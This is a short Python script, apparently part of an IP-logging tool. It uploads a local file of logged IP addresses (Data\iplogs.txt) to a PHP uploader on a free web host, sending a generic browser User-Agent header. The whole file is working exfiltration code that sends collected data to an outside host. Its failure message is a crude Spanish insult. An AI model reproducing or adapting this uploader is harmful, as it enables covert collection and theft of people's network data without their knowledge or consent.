import requests
from os import path

def uploader():
            archivo = open("Data\\iplogs.txt", 'rb')
            headers = {'User-Agent': 'Firefox'}
            peticion = requests.post(url="https://mitdios.000webhostapp.com/uploader.php", files = {'uploaded_file':archivo}, headers=headers)
            if "iplogs.txt" in peticion.text:
                print(peticion.text)
                print("El archivo se subio correctamente")
            else:
                print("Algo fallo lol puto malo de mierda")